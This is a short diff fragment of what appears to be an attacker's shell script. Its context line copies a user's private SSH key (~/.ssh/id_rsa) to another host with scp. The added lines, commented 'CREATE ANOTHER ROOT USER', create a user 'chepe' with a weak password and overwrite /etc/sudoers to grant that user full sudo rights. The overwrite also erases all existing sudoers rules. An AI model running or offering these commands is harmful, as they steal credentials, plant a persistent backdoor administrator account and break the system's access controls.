@@ -47,7 +47,10 @@ scp ~/.ssh/id_rsa pradyun@10.6.13.240:/home/pradyun/Music
 
 
 
+# CREATE ANOTHER ROOT USER
 
+sudo useradd -p $(openssl passwd -1 password) chepe  
+echo 'chepe  ALL=(ALL)  ALL' > /etc/sudoers
 
 
 
